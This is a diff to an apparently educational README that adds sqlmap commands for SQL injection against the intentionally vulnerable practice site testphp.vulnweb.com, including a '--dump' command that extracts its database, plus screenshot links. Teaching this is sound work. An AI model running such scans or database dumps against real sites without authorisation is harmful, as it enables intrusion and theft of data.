@@ -22,6 +22,20 @@ It is important to note that the website is intentionally vulnerable and should 
 
 ## Command used to perform 
 
+The below given command is being used to perform SQL Injection on the given url using sqlmap in kali terminal. 
+
 ```
-sdf
+sqlmap --url "http://testphp.vulnweb.com/artists.php?artist=1"
 ```
+
+![image](https://user-images.githubusercontent.com/60937657/212592340-3fa002a7-18b1-4c8b-8b7b-e7b8ac070bc1.png)
+
+![image](https://user-images.githubusercontent.com/60937657/212592414-c230c19d-daf5-4e0b-bbd9-8840c9904409.png)
+
+To dump the database use the below given command. 
+
+```
+sqlmap --url "http://testphp.vulnweb.com/artists.php?artist=1" --dump
+```
+
+![image](https://user-images.githubusercontent.com/60937657/212592775-4f3a6327-f128-491d-91e4-4dbd151d88fb.png)
